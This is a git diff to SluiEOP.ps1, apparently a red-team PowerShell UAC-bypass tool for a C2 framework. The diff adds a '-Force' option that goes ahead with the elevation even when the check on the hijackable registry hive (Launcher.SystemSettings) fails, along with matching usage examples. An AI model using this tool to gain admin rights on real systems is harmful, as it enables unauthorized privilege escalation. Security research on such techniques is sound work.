@@ -46,6 +46,12 @@
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "cmd /c start mspaint.exe" -Verbose
    Displays process verbose info and Spawn mspaint with high privileges (Admin)
+   Remark: This function does not work under meterpeter C2 framework
+
+.EXAMPLE
+   PS C:\> .\SluiEOP.ps1 "cmd /c start mspaint.exe" -Force
+   Force EOP (create vuln Hive) and spawn mspaint with high privileges (Admin)
+   Remark: This function does not work under meterpeter C2 framework
 
 .INPUTS
    None. You cannot pipe objects into SluiEOP.ps1
@@ -77,10 +83,9 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
-
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
-If($CheckVuln -eq $True){
+If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
 
    ## SluiEOP meterpeter post-module banner
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
